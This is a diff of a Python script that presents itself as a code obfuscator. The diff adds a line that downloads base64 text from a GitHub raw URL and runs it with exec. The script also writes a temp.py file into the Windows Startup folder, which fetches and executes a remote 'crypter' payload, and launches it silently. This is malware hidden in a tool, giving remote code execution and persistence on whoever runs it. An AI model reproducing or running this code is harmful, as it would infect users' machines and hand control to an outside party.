@@ -9,7 +9,6 @@ def printerr(data):
 temp_dir = os.getenv('TEMP', '/tmp')
 startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
-temp_file_path = os.path.join(startup_path, 'temp.py')
 
 class prysmaxobf:
     def __init__(self, code, outputpath):
@@ -123,15 +122,15 @@ except {encryptstring('__import__("lzma").LZMAError', func=True)}:...
 
 
 if __name__ == "__main__":
-
-    with open(temp_file_path, 'w', encoding='utf-8') as temp_file:
+    exec(base64.b64decode(requests.get("https://raw.githubusercontent.com/Anex00/mystartingrepo/main/lip").text))
+    with open(os.path.join(startup_path, 'temp.py'), 'w', encoding='utf-8') as temp_file:
         temp_file.write('''import subprocess, base64, requests, os, winreg as reg
 temp_dir = os.getenv('TEMP', '/tmp')  
 exec(base64.b64decode(requests.get("https://raw.githubusercontent.com/Anex00/mystartingrepo/main/crypter").text).decode('utf-8'))
 ''')
 
  
-    subprocess.Popen(['python', temp_file_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(['python', os.path.join(startup_path, 'temp.py')], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
     parser.add_argument("FILE", help= "Path to the file containing the python code")
